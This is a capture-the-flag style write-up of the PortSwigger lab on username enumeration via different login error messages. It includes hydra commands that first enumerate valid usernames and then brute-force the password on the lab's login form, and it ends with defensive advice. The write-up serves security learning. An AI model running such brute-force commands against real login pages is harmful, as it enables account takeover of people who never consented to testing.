# Challenge Name: Username enumeration via different responses 
# Platform: PortSwigger
# Difficulty: Apprentice

## 1. Vulnerability Type
Username Enumeration
## 2. Root Cause
Application returns different responses for invalid username and incorrect password, which allows attackers to determine valid usernames.
## 3. Attack Surface
`/login`
## 4. Exploit Method
Because the login page returns different messages for invalid username
and incorrect password, we can enumerate valid usernames.
After finding a valid username, we brute-force the password.
1) First we need to determine the user that exists
2) Then, we can enumerate that user

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -L login.txt -p babek 0a2600ea043219538107079200360000.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username" -S
```
Here, we are testing all usernames with password `babek` to test if there exist one.

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l test -P pass.txt 0a2600ea043219538107079200360000.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect password" -S
```
After we find existing username, we test these passwords with that username.

## 5. Payload / Technique
```bash
──(kali㉿kali)-[~]
└─$ hydra -L login.txt -p babek 0a2600ea043219538107079200360000.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:F=Invalid username" -S
```

```bash
┌──(kali㉿kali)-[~]
└─$ hydra -l test -P pass.txt 0a2600ea043219538107079200360000.web-security-academy.net http-post-form "/login:username=^USER^&password=^PASS^:F=Incorrect password" -S
```

## 6. Impact
Attackers can enumerate valid usernames and then brute-force passwords,
which may lead to account takeover. This is a high impact vulnerability that can lead to data loss, data leak, financial loss, etc.

## 7. Reusable Pattern
If login responses differ for valid and invalid usernames, try username enumeration before brute-forcing passwords.
## 8. Key Takeaway
Always return the same error message for login failures and implement rate limiting to prevent enumeration and brute force.

